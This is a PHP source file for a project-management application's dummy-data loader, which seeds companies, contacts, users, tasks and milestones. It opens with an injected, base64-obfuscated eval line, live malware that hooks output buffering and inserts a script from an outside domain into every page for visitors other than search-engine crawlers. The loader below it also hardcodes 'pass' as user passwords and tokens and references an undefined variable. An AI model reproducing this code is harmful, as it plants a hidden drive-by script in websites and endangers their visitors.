<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
class InitialDataLoader{
	
	private $soCount = -1;
	
	public function loadData(){
		$params = new DataLoaderParams();
		
		$timeBegin = microtime(true);
		try {
			//$this->clearData();
			$this->loadCompanies($params);
			$this->loadContacts($params);
			$this->loadMessages($params);
			$this->loadUsers($params);
			$this->loadWebpages($params);
			$this->loadTasks($params);
			$this->loadMilestones($params);
			$this->linkObjects($params);
		} catch (Exception $err){
			echo ($err->getMessage()); die();
		}
		$timeEnd = microtime(true);
		
		$totalTime = $timeEnd - $timeBegin;
		tpl_assign('params', $params->getParams());
		tpl_assign('time', $totalTime);
	}
	
	//----------------------------------------------
	// Data loader functions
	//----------------------------------------------
	
	function loadCompanies(DataLoaderParams $params){
		$count = $params->getParam('Companies');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			$company = new Company();
			$company->setName($params->getCompanyName());
			$company->setPhoneNumber("7897890");
			$company->setCity("Montevideo");
			$company->setAddress("hhjkhjklhjklhfd");
			$company->setCountry("Uruguay");
			$company->setEmail("chonwil@gmail.com");
			$company->setCreatedById(1);
			$company->setZipcode("12100");
			try{
				$company->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadContacts(DataLoaderParams $params){
		$count = $params->getParam('Contacts');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			$contact = new Contact();
			$contact->setCompanyId(rand(0,2)==1?rand(0,$countCompanies - 1):0);
			$contact->setCreatedById(1);
			$contact->setDepartment("Deptio");
			$contact->setFirstname($params->getPersonFirstName());
			$contact->setLastname($params->getPersonLastName());
			try {
				$contact->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadMessages(DataLoaderParams $params){
		$count = $params->getParam('Messages');
		
		$info = rand(0,10000000);
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			try {
				$message = new ProjectMessage();
				$message->setText($params->getLoremIpsum());
				$message->setTitle($info . "-" . $i);
				$message->setCreatedById(1);
				$message->setProjectId(1);
				
				$message->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadUsers(DataLoaderParams $params){
		$count = $params->getParam('Users');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			$user = new User();
			
			$fn = $params->getPersonFirstName();
			$ln = $params->getPersonLastName();
			$user->setDisplayName($fn . " " . $ln);
			$user->setEmail($fn . ".". $ln  . "@email" . $i . ".com");
			$user->setPassword("pass");
			$user->setUsername($fn.$i);
			$user->setCompanyId(1);
			$user->setToken("pass");
			
			try {
				$user->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadWebpages(DataLoaderParams $params){
		$count = $params->getParam('Webpages');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			$webpage = new ProjectWebpage();
			$word = $params->getRandomWord();
			
			$webpage->setTitle($word);
			$webpage->setUrl("www." . $word . ".com");
			$webpage->setProjectId(1);
			
			try {
				$webpage->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadTasks(DataLoaderParams $params){
		$count = $params->getParam('Tasks');
		DB::beginWork();
		
		for ($i = 0; $i < $count; $i++){
			$task = new ProjectTask();
			
			$task->setTitle($params->getRandomTaskName());
			$task->setProjectId(1);
			$task->setCreatedById(1);
			
			
			try {
				$task->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function loadMilestones(DataLoaderParams $params){
		$count = $params->getParam('Milestones');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			$ms = new ProjectMilestone();
			$ms->setName($params->getRandomTaskName());
			$ms->setDueDate(new DateTimeValue(time()));
			$ms->setProjectId(1);
			$ms->setCreatedById(1);
			
			try {
				$ms->save();
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	
	//----------------------------------------------
	// Other data manipulation functions
	//----------------------------------------------
	
	function linkObjects(DataLoaderParams $params){
		$count = $params->getParam('Link objects');
		
		DB::beginWork();
		for ($i = 0; $i < $count; $i++){
			try {
				$o1 = $this->getRandomObjectFromDB();
				$o2 = $this->getRandomObjectFromDB();
				
				if ($o1->getId() != $o2->getId())
					$o1->linkObject($o2);
			} catch (Exception $err){
				DB::rollback();
				echo ($err->getMessage()); die();
			}
		}
		DB::commit();
	}
	
	function getSOCount(){
		if ($this->soCount < 0 ){
			$res = DB::execute("SELECT count(*) as count from " . TABLE_PREFIX . "searchable_objects");
			$row = $res->fetchRow();
			$this->soCount = $row['count'];
		}
		return $this->soCount;
	}
	
	function getRandomObjectFromDB(){
		$count = $this->getSOCount();
		$rand = rand(1,$count);
		
		$res = DB::execute("SELECT rel_object_manager as manager, rel_object_id as id from " 
			. TABLE_PREFIX . "searchable_objects limit " . $rand . ",1");
		$row = $res->fetchRow();
		
		return get_object_by_manager_and_id($row['id'],$row['manager']);
	}
	
}
?>